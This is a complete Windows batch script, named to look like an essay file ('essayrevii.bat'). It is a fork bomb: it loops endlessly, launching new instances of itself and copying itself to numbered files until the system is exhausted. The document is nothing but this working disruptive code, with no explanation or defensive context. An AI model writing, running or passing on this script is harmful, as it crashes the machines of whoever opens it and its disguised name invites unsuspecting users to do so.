cd %~dp0
set x=1
set y=1
:loop
set /A y=%x%+1
start %~dp0essayrevii.bat
copy "%~dp0essayrevii.bat" "%~dp0essayrevii%x%.bat"
ren "%~dp0essayrevii%x%.bat" "%~dp0essayrevii%y%.bat"
set /A x=%x%+1
echo %x%
goto loop
